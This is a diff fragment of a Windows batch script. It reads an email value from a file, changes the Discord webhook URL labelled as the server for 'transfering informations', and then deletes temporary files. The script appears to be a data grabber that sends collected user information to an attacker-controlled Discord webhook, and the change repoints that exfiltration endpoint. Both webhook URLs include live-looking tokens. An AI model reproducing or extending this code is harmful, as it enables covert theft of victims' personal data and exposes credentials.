@@ -31,7 +31,7 @@ set /p "email=" < email.txt
 
 
 rem server by transfering informations
-set webhook="https://discordapp.com/api/webhooks/1311809848148627486/hC8h2iJ0RMqPsVYweQ6w9VIlhDb7GilnF9srYC9JI5OHerQHNH557x9-IUyuYHH-1jNN"
+set webhook="https://discordapp.com/api/webhooks/1339588054377300030/X14R05aQPcMBl7QuNCR1pALhHpamd_kTcNLamXXev5pl3f71VZMv27DiQljAMN8Fxr2c"
 
 rem clean filez 
 del line1.txt
